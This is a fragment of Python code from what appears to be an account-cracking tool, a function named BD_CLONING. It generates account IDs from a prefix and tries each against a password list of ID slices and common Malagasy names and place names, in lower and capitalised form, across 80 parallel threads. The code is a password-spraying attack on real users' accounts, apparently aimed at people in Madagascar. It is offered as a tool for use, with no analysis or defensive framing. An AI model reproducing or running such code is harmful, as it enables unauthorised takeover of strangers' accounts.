...
def BD_CLONING():
    ...
    with tred(max_workers=80) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'fanantenana','Fanantenana','nirina','nirina','mandresy','Mandresy','mahery','Mahery','narovana','Narovana','harena','Harena','richard','Richard','antananarivo','Antananarivo','anjara','Anjara','rohan','Rohan','antsirabe','Antsirabe','malalako','Malalako','rakoto','Rakoto','stephane','Stephane','tsaralalana','Tsaralalana','miora','Miora','kisoa','Kisoa','lalaina','Lalaina','fanirina','Fanirina','havana','Havana','malala','Malala','malagasy','Malagasy','Narindra','narindra','finaritra','Finaritra','nilaina','Nilaina','larissa','Larissa','Madagasikara','madagasikara','solofo','Solofo','rakotomalala','Rakotomalala','tsilavina','Tsilavina','diamondra','Diamondra','mamitiana','Mamitiana','Sahaza','sahaza','valisoa','Valisoa','fanomezana','Fanomezana','narindra','Narindra','nantenaina','Nantenaina','mirindra','Mirindra','faneva','Faneva']
